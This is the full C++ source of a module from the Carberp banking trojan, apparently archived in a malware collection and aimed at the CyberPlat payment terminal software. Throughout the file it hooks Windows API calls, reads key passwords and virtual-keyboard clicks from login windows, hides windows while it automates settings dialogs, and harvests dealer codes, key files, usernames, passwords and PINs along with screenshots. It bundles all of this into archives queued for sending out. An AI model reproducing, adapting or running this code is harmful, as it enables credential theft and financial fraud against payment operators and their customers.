/*
  name      Carberp Botnet
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */
#include "Cyberplat.h"

#include "CabPacker.h"
#include "Loader.h"
#include "ScreenShots.h"
#include "String.h"
#include "StrConsts.h"
#include "CyberPlatDLL.h"

#include "WndUtils.h"


#include "BotDebug.h"
#include "DbgTemplates.h"


// ��������� ������ ������ ���������� �����
#define Cuber_LDBG DBGOutMessage<>


typedef HANDLE ( WINAPI *CPLATFUNC_CreateFileW	   )( LPCWSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile );
CPLATFUNC_CreateFileW REAL_CPLATCreateFileW;

//HANDLE WINAPI HOOK_CPLATCreateFileW( LPCWSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile );

typedef struct
{
	bool  VirtualKeyboard;
	char *VirtualPassword;
} *PCYBERKEYBOARD;

PCYBERKEYBOARD pCyberKeyboard;

HANDLE WINAPI HOOK_CPLATCreateFileW( LPCWSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile )
{
	WCHAR FileName[ MAX_PATH ];
	plstrcpyW( FileName, lpFileName );
	if ( GetFileFormat( (WCHAR*)FileName ) == 0x1AF2F9 )
	{		
		HWND hCPlatForm = (HWND)pFindWindowA( NULL, "������������� ������������ 1.0.0.28" );
		if ( hCPlatForm != NULL )
		{
			Cuber_LDBG( "�yberPlat","����� ���� �������������� �������������");
			HWND hKeyName  = (HWND)pFindWindowExA( hCPlatForm, 0, "ComboBox", 0 );
			HWND hPassword = (HWND)pFindWindowExA( hCPlatForm, 0, "Edit",	  0 );
			
			DWORD dwSize_1 = (DWORD)pSendMessageA( hKeyName, WM_GETTEXTLENGTH, 0, 0 ) + 1;
			DWORD dwSize_2 = (DWORD)pSendMessageA( hPassword, WM_GETTEXTLENGTH, 0, 0 ) + 1;
			if ( dwSize_1 > 1 && dwSize_2 > 1)
			{
				
				char *KeyName  = (char*)MemAlloc( dwSize_1 + 1 );
				char *Password = (char*)MemAlloc( dwSize_2 + 1 );

				//get key name
				pSendMessageA( hKeyName, WM_GETTEXT,  dwSize_1, (LPARAM)KeyName );
				//get password
				pSendMessageA( hPassword, WM_GETTEXT, dwSize_2, (LPARAM)Password );	
				if ( Password && KeyName )
				{
					char Template[] = "Key name: %s\r\n"
									  "Key password: %s\r\n"
									  "Key Path: %ws\r\n";

					char *Buffer = (char*)MemAlloc( 1024 );

					typedef int ( WINAPI *fwsprintfA )( LPTSTR lpOut, LPCTSTR lpFmt, ... );
					fwsprintfA pwsprintfA = (fwsprintfA)GetProcAddressEx( NULL, 3, 0xEA3AF0D7 );

					if ( pCyberKeyboard->VirtualKeyboard && pCyberKeyboard->VirtualPassword )
					{
						char * rrr=pCyberKeyboard->VirtualPassword;
						pwsprintfA( Buffer, Template, KeyName, rrr, FileName );
					}
					else
					{
						pwsprintfA( Buffer, Template, KeyName, Password, FileName );
					}
					UnhookCreateFileW();

					bool AddLog = false;

					PCHAR TempFile = File::GetTempNameA();

					if ( TempFile )
					{
						HANDLE hLog = (HANDLE)pCreateFileA( TempFile, GENERIC_WRITE, FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0 );
						if ( hLog != INVALID_HANDLE_VALUE )
						{
							DWORD dwWritten = 0;

							if ( (BOOL)pWriteFile( hLog, Buffer, m_lstrlen( Buffer ), &dwWritten, 0 ) )
							{
								AddLog = true;
							}
						}

						pCloseHandle( hLog );
					}		

					MemFree( Buffer );


                    // ������ ��������
					PCHAR ScreenFile = File::GetTempNameA();
					
					bool bAddScreen = ScreenShot::CaptureScreenA(ScreenFile);
					//----------------------------------

					if ( AddLog )
					{
						PCHAR Path = File::GetTempNameA();

						if ( Path )
						{
							Cuber_LDBG("�yberPlat","�������� �� ���");
							HCAB hCab = CreateCab( Path );

							if ( hCab )
							{
								AddFileToCab( hCab, TempFile, GetStr(StrLogFileTextData).t_str());

								if ( bAddScreen )
								{
									AddFileToCab( hCab, ScreenFile, GetStr(StrLogFileScreenShot).t_str());
								}

								char *NetFile = GetNetInfo();

								if ( NetFile != NULL )
								{
									AddFileToCab( hCab, NetFile, GetStr(StrLogFileNetInfo).t_str());
									pDeleteFileA( NetFile );
								}

								STR::Free( NetFile );
								PCHAR FileNameStr = WSTR::ToAnsi(FileName, 0);
								AddFileToCab( hCab, FileNameStr, "secret.key" );
								STR::Free(FileNameStr);
							}

							CloseCab( hCab );
							
							PBSSINIST pBank = (PBSSINIST)MemAlloc( sizeof( PBSSINIST ) );

							if ( pBank )
							{
								pBank->FilePath = (char*)MemAlloc( m_lstrlen( Path ) + 1 );
								pBank->dwType   = 4;

								m_memcpy( pBank->FilePath, Path, m_lstrlen( Path ) );								

								Cuber_LDBG("�yberPlat","���������� ������");
								DataGrabber::SendCabDelayed(NULL, pBank->FilePath, "cyberplat");
                                pDeleteFileA(pBank->FilePath);
//								StartThread( SendBSSInist, pBank );
							}
						}

						STR::Free( Path );
					}
					Cuber_LDBG("�yberPlat","����� ��������������� �����"); 
					pDeleteFileA( TempFile   );
					pDeleteFileA( ScreenFile );

					STR::Free( TempFile	);
					STR::Free( ScreenFile );				

					MemFree( Password );
					MemFree( KeyName  );
				}
			}
		}
	}
	return REAL_CPLATCreateFileW( lpFileName, dwDesiredAccess, dwShareMode, lpSecurityAttributes, dwCreationDisposition, dwFlagsAndAttributes, hTemplateFile ); 
}

typedef BOOL ( WINAPI *PCyberTranslateMessage )( const MSG *lpMsg );
PCyberTranslateMessage Real_CyberTranslateMessage;

BOOL WINAPI Hook_CyberTranslateMessage( const MSG *lpMsg )
{
	if ( lpMsg->message == WM_LBUTTONUP && GetCurrentWindowHash() == 0x659D733C )
	{
		char Buffer[100];
		int Len = (int)pGetWindowTextA( lpMsg->hwnd, &Buffer[0], 100 );
		if ( Len )
		{
			Buffer[ Len ] = '\0';

			if ( !pCyberKeyboard->VirtualPassword )
			{
				pCyberKeyboard->VirtualPassword = (char*)MemAlloc( m_lstrlen( Buffer ) + 2 + 1 );
			}
			else
			{
				char *p = (char*)MemRealloc( pCyberKeyboard->VirtualPassword, m_lstrlen( pCyberKeyboard->VirtualPassword ) + m_lstrlen( Buffer ) + 2 + 1 );
				pCyberKeyboard->VirtualPassword = p;
				
			}

			if ( pCyberKeyboard->VirtualPassword )
			{
				typedef int ( WINAPI *fwsprintfA )( LPTSTR lpOut, LPCTSTR lpFmt, ... );
				fwsprintfA pwsprintfA = (fwsprintfA)GetProcAddressEx( NULL, 3, 0xEA3AF0D7 );

				pwsprintfA( pCyberKeyboard->VirtualPassword + m_lstrlen( pCyberKeyboard->VirtualPassword ), "[%s]", Buffer );
				pCyberKeyboard->VirtualKeyboard = true;
			}
		}
	}
	return Real_CyberTranslateMessage( lpMsg );
}

typedef BOOL ( WINAPI *PExtTextOutW )(HDC hdc, int x, int y, UINT options, CONST RECT * lprect,
										LPCWSTR lpString, UINT c, CONST INT * lpDx);
static PExtTextOutW Real_ExtTextOutW;

BOOL WINAPI HOOK_ExtTextOutW(HDC hdc, int x, int y, UINT options, CONST RECT * lprect,
															LPCWSTR lpString, UINT c, CONST INT * lpDx)
{
	const DWORD dwDotLen = 6;
	static WCHAR balance[64];
	static int lenBalance = 0;
	HWND hWnd = WindowFromDC(hdc); 
	int len = m_wcslen(lpString);
	if ( (hWnd) && (len > dwDotLen) )
	{
		if ( 0 == m_wcsncmp((WCHAR *)lpString, (WCHAR *)L"�����:", dwDotLen ) )
		{
			static DWORD bBufSize = 256;
			char *szBuf = (char*)MemAllocAndClear(bBufSize);
			pGetClassNameA(hWnd, szBuf, bBufSize - 1);
		
			if ( 0 == m_lstrcmp(szBuf, "msctls_statusbar32") )
			{
				LPCWSTR wBalance = lpString;
				wBalance = wBalance + dwDotLen + 1;
				len -= dwDotLen + 1;
				if( len != lenBalance || m_wcsncmp( (WCHAR*)wBalance, balance, len ) )
				{
					lenBalance = len;
					m_wcsncpy( balance, (WCHAR*)wBalance, len );
					Cuber_LDBG( "�yberPlat", "������ = %ls", balance );
				}
				//OutputDebugStringA(szBuf);
			}

			if (szBuf)
				MemFree(szBuf);
		}
	}

	return Real_ExtTextOutW( hdc, x, y, options, lprect, lpString, c, lpDx );
}

bool bCyberplatHooks;

void HookCyberplat()
{
	if ( !bCyberplatHooks )
	{
		pCyberKeyboard = (PCYBERKEYBOARD)MemAlloc( sizeof( PCYBERKEYBOARD ) );

		if ( !pCyberKeyboard )
		{
			return;
		}

		UnhookCreateFileW();
		UnhookTranslateMessage();

		const DWORD HASH_CreateFileW = 0x8F8F102;
		if ( HookApi( DLL_KERNEL32, HASH_CreateFileW, &HOOK_CPLATCreateFileW ) )
		{
			__asm mov [REAL_CPLATCreateFileW], eax
		}

		const DWORD HASH_TranslateMessage = 0xC45D9631;
		if ( HookApi( DLL_USER32, HASH_TranslateMessage, &Hook_CyberTranslateMessage ) )
		{
			__asm mov [Real_CyberTranslateMessage], eax
		}

		//* ExtTextOutW hook *//
		const DWORD HASH_ExtTextOutW = 0x3D54FCEC;
		if ( HookApi( DLL_GDI, HASH_ExtTextOutW, &HOOK_ExtTextOutW ) )
		{
			__asm mov [Real_ExtTextOutW], eax
		}
		bCyberplatHooks = true;
		Cuber_LDBG( "�yberPlat", "���� �����" );
	}

	return;
}

//PC Version
typedef BOOL ( WINAPI *PShowWindow )( HWND hWnd, int nCmdShow );

PShowWindow REAL_ShowWindow;

BOOL WINAPI HOOK_ShowWindow( HWND hWnd, int nCmdShow )
{

	return REAL_ShowWindow( hWnd, SW_HIDE );
}

void HookShowWindow()
{

	UnhookShowWindow();
	const DWORD HASH_ShowWindow = 0x7506E960;
	if ( HookApi( DLL_USER32, HASH_ShowWindow, &HOOK_ShowWindow ) )
	{
		__asm mov [REAL_ShowWindow], eax
	}
}


bool GrabCyber( HWND hCyberForm )
{
	bool ret = false;
	if ( hCyberForm != NULL )
	{
		typedef int ( WINAPI *fwsprintfA )( LPTSTR lpOut, LPCTSTR lpFmt, ... );
		fwsprintfA pwsprintfA = (fwsprintfA)GetProcAddressEx( NULL, 3, 0xEA3AF0D7 );

		pSendMessageTimeoutA( hCyberForm, WM_COMMAND, 0x00008006, 0, 0, 300, 0 );	
	
		HWND hOptions = (HWND)pFindWindowExA( 0, 0, MAKEINTATOM( 0x8002 ), "���������" );
		
		if ( hOptions != NULL )
		{
			HWND hFader = (HWND)pFindWindowExA( hOptions, 0, MAKEINTATOM( 0xC041 ), "Tab1" );

			if ( hFader != NULL )
			{
				HWND hDialog = (HWND)pFindWindowExA( hFader, 0, MAKEINTATOM( 0x8002 ), NULL );

				if ( hDialog != NULL )
				{
					HWND hListBox = (HWND)pFindWindowExA( hDialog, 0, MAKEINTATOM( 0xC01A ), NULL );

					if ( hListBox != NULL )
					{
						HWND hOptButton = (HWND)pFindWindowExA( hDialog, 0, MAKEINTATOM( 0xC017 ), "�������� �����" );

						if ( hOptButton != NULL )
						{
							PCHAR CabName = File::GetTempNameA();		

 							HCAB hCab = CreateCab( CabName );

							int ItemsCount = (int)pSendMessageA( hListBox, LB_GETCOUNT, 0, 0 );	//���������� ��������� � ���������
						
							for ( int i = 0; i < ItemsCount; i++ )
							{
								char PointName[ 100 ];
								pSendMessageA( hListBox, LB_GETTEXT, (WPARAM)i, (LPARAM)PointName );

								pSendMessageA( hListBox, LB_SETCURSEL, i, 0 );
								pSendMessageTimeoutA( hOptButton, BM_CLICK, 0, 0, 0, 100, NULL );
					
								HWND hPointOpts = (HWND)pFindWindowExA( 0, 0, MAKEINTATOM( 0x8002 ), "�������� �����" );		
								
								if ( hPointOpts != NULL )
								{
									HWND hDillerCode  = (HWND)pFindWindowExA( hPointOpts, 0,			 MAKEINTATOM( 0xC018 ), NULL );
									HWND hRecvCode    = (HWND)pFindWindowExA( hPointOpts, hDillerCode,  MAKEINTATOM( 0xC018 ), NULL );
									HWND hKeysDest    = (HWND)pFindWindowExA( hPointOpts, hRecvCode,	 MAKEINTATOM( 0xC01C ), NULL );
									HWND hKeysPath    = (HWND)pFindWindowExA( hPointOpts, hKeysDest,	 MAKEINTATOM( 0xC018 ), NULL );
									HWND hCodePhrase  = (HWND)pFindWindowExA( hPointOpts, hKeysPath,	 MAKEINTATOM( 0xC018 ), NULL );
									HWND hCodePhrasep = (HWND)pFindWindowExA( hPointOpts, hCodePhrase,	 MAKEINTATOM( 0xC018 ), NULL );
									HWND hCloseKeySN  = (HWND)pFindWindowExA( hPointOpts, hCodePhrasep, MAKEINTATOM( 0xC01C ), NULL );
									HWND hOpenBankSN  = (HWND)pFindWindowExA( hPointOpts, hCloseKeySN,  MAKEINTATOM( 0xC01C ), NULL );

									char *DillerCode  = GetWndText( hDillerCode );
									char *RecvCode    = GetWndText( hRecvCode );
									char *KeysDest    = GetWndText( hKeysDest );
									char *KeysPath    = GetWndText( hKeysPath );
									char *CodePhrase  = GetWndText( hCodePhrase );
									char *CodePhrasep = GetWndText( hCodePhrasep );
									char *CloseKeySN  = GetWndText( hCloseKeySN );
									char *OpenBankSN  = GetWndText( hOpenBankSN );

									PCHAR FileName = File::GetTempNameA();
									HANDLE hFile   = (HANDLE)pCreateFileA( FileName, GENERIC_WRITE, FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0 );

									if ( hFile != (HANDLE)-1 )
									{
										Cuber_LDBG("�yberPlat","��������� ��� ������ � ������� �� � ��������"); 
										char Template_0[] = "��������: %s\r\n";
										char Template_1[] = "��� ������: %s\r\n";
										char Template_2[] = "��� ����� ������: %s\r\n";
										char Template_3[] = "�������� ������: %s\r\n";
										char Template_4[] = "���� � ������: %s\r\n";
										char Template_5[] = "������� �����: %s\r\n";
										char Template_6[] = "������ ������� �����: %s\r\n";
										char Template_7[] = "�������� ����� ��������� ����� �����: %s\r\n";
										char Template_8[] = "�������� ����� ��������� ����� �����: %s\r\n";

										char OutBuffer[1024];

										DWORD dwWritten = 0;

										pwsprintfA( OutBuffer, Template_0, PointName );
										pWriteFile( hFile, OutBuffer, m_lstrlen( OutBuffer ), &dwWritten, 0 );

										pwsprintfA( OutBuffer, Template_1, DillerCode );
										pWriteFile( hFile, OutBuffer, m_lstrlen( OutBuffer ), &dwWritten, 0 );

										pwsprintfA( OutBuffer, Template_2, RecvCode );
										pWriteFile( hFile, OutBuffer, m_lstrlen( OutBuffer ), &dwWritten, 0 );

										pwsprintfA( OutBuffer, Template_3, KeysDest );
										pWriteFile( hFile, OutBuffer, m_lstrlen( OutBuffer ), &dwWritten, 0 );

										pwsprintfA( OutBuffer, Template_4, KeysPath );
										pWriteFile( hFile, OutBuffer, m_lstrlen( OutBuffer ), &dwWritten, 0 );

										pwsprintfA( OutBuffer, Template_5, CodePhrase );
										pWriteFile( hFile, OutBuffer, m_lstrlen( OutBuffer ), &dwWritten, 0 );

										pwsprintfA( OutBuffer, Template_6, CodePhrasep );
										pWriteFile( hFile, OutBuffer, m_lstrlen( OutBuffer ), &dwWritten, 0 );

										pwsprintfA( OutBuffer, Template_7, CloseKeySN );
										pWriteFile( hFile, OutBuffer, m_lstrlen( OutBuffer ), &dwWritten, 0 );

										pwsprintfA( OutBuffer, Template_8, OpenBankSN );
										pWriteFile( hFile, OutBuffer, m_lstrlen( OutBuffer ), &dwWritten, 0 );
										
										

										pCloseHandle( hFile );

										pwsprintfA( OutBuffer, "info_%s-%s", DillerCode, RecvCode );

										AddDirToCab( hCab, KeysPath, OutBuffer );

										m_lstrcat( OutBuffer, "\\"		 );
										m_lstrcat( OutBuffer, "Info.txt" );

										AddFileToCab( hCab, FileName, OutBuffer );
										pDeleteFileA( FileName );
										STR::Free( FileName );

										MemFree( PointName	 );
										MemFree( RecvCode	 );
										MemFree( KeysDest    );
										MemFree( KeysPath	 );
										MemFree( CodePhrase  );
										MemFree( CodePhrasep );
										MemFree( CloseKeySN  );
										MemFree( OpenBankSN  );									

									}
								}

								pSendMessageA( hPointOpts, WM_CLOSE, 0, 0 );								
							}

							HWND hUsersDialog = (HWND)pFindWindowExA( hFader, hDialog, MAKEINTATOM( 0x8002 ), NULL );

							if ( hUsersDialog != NULL )
							{
								HWND hListBox = (HWND)pFindWindowExA( hUsersDialog, 0, MAKEINTATOM( 0xC01A ), NULL );

								if ( hListBox != NULL )
								{
									HWND hOptButton = (HWND)pFindWindowExA( hUsersDialog, 0, MAKEINTATOM( 0xC017 ), "�������� ������������" );

									if ( hOptButton != NULL )
									{
										int ItemsCount = (int)pSendMessageA( hListBox, LB_GETCOUNT, 0, 0 );	//���������� ��������� � ���������
						
										for ( int i = 0; i < ItemsCount; i++ )
										{
											char Username[ 100 ];
											pSendMessageA( hListBox, LB_GETTEXT, (WPARAM)i, (LPARAM)Username );
											
											pSendMessageA( hListBox, LB_SETCURSEL, i, 0 );
											pSendMessageTimeoutA( hOptButton, BM_CLICK, 0, 0, 0, 100, NULL );
										
											HWND hUserOpts = (HWND)pFindWindowExA( 0, 0, MAKEINTATOM( 0x8002 ), "�������� ������������" );		
											
											if ( hUserOpts != NULL )
											{
												HWND hUserName  = (HWND)pFindWindowExA( hUserOpts,  0,		      MAKEINTATOM( 0xC018 ), NULL );
												HWND hPassword  = (HWND)pFindWindowExA( hUserOpts,  hUserName,   MAKEINTATOM( 0xC018 ), NULL );
												HWND hPassword2 = (HWND)pFindWindowExA( hUserOpts,  hPassword,   MAKEINTATOM( 0xC018 ), NULL );
												HWND hOperCode	= (HWND)pFindWindowExA( hUserOpts,  hPassword2,  MAKEINTATOM( 0xC018 ), NULL );
												HWND hRecvCode  = (HWND)pFindWindowExA( hUserOpts,  hOperCode,   MAKEINTATOM( 0xC01C ), NULL );
												HWND hAdmRights = (HWND)pFindWindowExA( hUserOpts,  hRecvCode ,  MAKEINTATOM( 0xC017 ), NULL );
												HWND hPinCode   = (HWND)pFindWindowExA( hUserOpts,  hAdmRights , MAKEINTATOM( 0xC018 ), NULL );

												PCHAR FileName = File::GetTempNameA();

												HANDLE hFile   = (HANDLE)pCreateFileA( FileName, GENERIC_WRITE, FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0 );

												if ( hFile != (HANDLE)-1 )
												{
													char *UserName  = GetWndText( hUserName );
													char *Password  = GetWndText( hPassword );
													char *Password2 = GetWndText( hPassword2 );
													char *OperCode  = GetWndText( hOperCode );
													char *RecvCode  = GetWndText( hRecvCode );
													char *PinCode   = GetWndText( hPinCode );

													

													char Template_1[] = "�����: %s\r\n";
													char Template_2[] = "������: %s\r\n";
													char Template_3[] = "������: %s\r\n";
													char Template_4[] = "��� ���������: %s\r\n";
													char Template_5[] = "��� ����� ������: %s\r\n";
													char Template_6[] = "��� ���: %s\r\n";

													char OutBuffer[1024];

													DWORD dwWritten = 0;

													pwsprintfA( OutBuffer, Template_1, UserName  );
													pWriteFile( hFile, OutBuffer, m_lstrlen( OutBuffer ), &dwWritten, 0 );

													pwsprintfA( OutBuffer, Template_2, Password  );
													pWriteFile( hFile, OutBuffer, m_lstrlen( OutBuffer ), &dwWritten, 0 );

													pwsprintfA( OutBuffer, Template_3, Password2 );
													pWriteFile( hFile, OutBuffer, m_lstrlen( OutBuffer ), &dwWritten, 0 );

													pwsprintfA( OutBuffer, Template_4, OperCode  );
													pWriteFile( hFile, OutBuffer, m_lstrlen( OutBuffer ), &dwWritten, 0 );

													pwsprintfA( OutBuffer, Template_5, RecvCode  );
													pWriteFile( hFile, OutBuffer, m_lstrlen( OutBuffer ), &dwWritten, 0 );

													pwsprintfA( OutBuffer, Template_6, PinCode   );
													pWriteFile( hFile, OutBuffer, m_lstrlen( OutBuffer ), &dwWritten, 0 );
																										
													pCloseHandle ( hFile );

													pwsprintfA( OutBuffer, "User_%s.txt", UserName );

													AddFileToCab( hCab, FileName, OutBuffer );
																										
													pDeleteFileA( FileName );
													STR::Free( FileName );

													MemFree( UserName  );
													MemFree( Password  );
													MemFree( Password2 );
													MemFree( OperCode  );
													MemFree( RecvCode  );
													MemFree( PinCode   );
												}
											}

											pSendMessageA( hUserOpts, WM_CLOSE, 0, 0 );	
										}
									}
								}
							}


							PCHAR ScreenFile = File::GetTempNameA();
							bool bAddScreen  = ScreenShot::CaptureScreenA(ScreenFile);



							if ( bAddScreen )
							{
								AddFileToCab( hCab, ScreenFile, GetStr(StrLogFileScreenShot).t_str());
							}

							pDeleteFileA( ScreenFile );
							STR::Free( ScreenFile );

							char *NetFile = GetNetInfo();

							if ( NetFile != NULL )
							{
								AddFileToCab( hCab, NetFile, GetStr(StrLogFileNetInfo).t_str());
								pDeleteFileA( NetFile );
							}
							STR::Free(NetFile);

							CloseCab( hCab );
							
							PBSSINIST pBank = (PBSSINIST)MemAlloc( sizeof( PBSSINIST ) );

							if ( pBank )
							{
//		

								DataGrabber::SendCabDelayed(NULL, CabName, "cyberplat");

								STR::Free( CabName );

								ret = true;
							}
						}
					}
				}
			}
		}

		pSendMessageA( hOptions, WM_CLOSE, 0, 0 );			
	}

	return ret;
}


bool bCyber = false;

bool IsCyberPlatPC()
{
	WCHAR *ModulePath = (WCHAR*)MemAlloc( MAX_PATH * sizeof(WCHAR));

	if ( ModulePath == NULL )
	{
		return false;
	}
	

	pGetModuleFileNameW( NULL, ModulePath, MAX_PATH );
	DWORD dwProcessHash = GetNameHash( ModulePath );
	
	for(int i=(int)plstrlenW(ModulePath);i>0;i-- )
	{
		if(ModulePath[i]!='\\')
			ModulePath[i]='\0';
		else
		{
			
			break;
		}
	}
	PCHAR dir=WSTR::ToAnsi(ModulePath,0);
	PCHAR dd=STR::New(2,dir,"CyberTerm.mdb");

/*
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

	������������ !!!!!!!!!!!!!!!!!!!!!!!!!!!

	if (FileExistsA(dd))
	{
		�ybertartStart(dir);
	}



*/


	STR::Free(dir);
	STR::Free(dd);

	MemFree( ModulePath );

	// ������ ���������� ���� ��� ����� ���� ������������ ����� ������
	return dwProcessHash == 0x210FD341;/* cyberterm.exe */
}

BOOL CALLBACK EnumWindowsProcCP( HWND hWnd, LPARAM lParam )
{
	if ( !hWnd )
	{
		return TRUE;
	}

	char *Title = GetWndText( hWnd );

	if ( Title != NULL )
	{
		if ( CompareUrl( "������ ��������*", Title ) )
		{
			if ( !bCyber )
			{
				HookShowWindow();

				if ( GrabCyber( hWnd ) )
				{
					bCyber = TRUE;
				}

				UnhookShowWindow();
			}
		}
	}

	return TRUE;
}


DWORD WINAPI CyberThread( LPVOID lpData )
{
	while ( 1 )
	{
		pEnumWindows( (WNDENUMPROC)EnumWindowsProcCP, NULL );

		if ( bCyber )
		{
			break;
		}

		pSleep( 100 );
	}

	return 0;
}

bool HookCyberplatPC()
{
	if ( ! IsCyberPlatPC() )
	{
		return false;
	}
	
	StartThread( CyberThread, NULL );

	return true;
}

bool IsCyber2Process()
{
	WCHAR *ModulePath = (WCHAR*)MemAlloc( MAX_PATH*sizeof (WCHAR) );
	if ( ModulePath == NULL )return false;
	pGetModuleFileNameW( NULL, ModulePath, MAX_PATH );
	DWORD dwProcessHash = GetNameHash( ModulePath );

	if ( dwProcessHash == 0x210FD341 )
	{
		MemFree( ModulePath );
		return true;
	}

	MemFree( ModulePath );/**/
	return false;
}
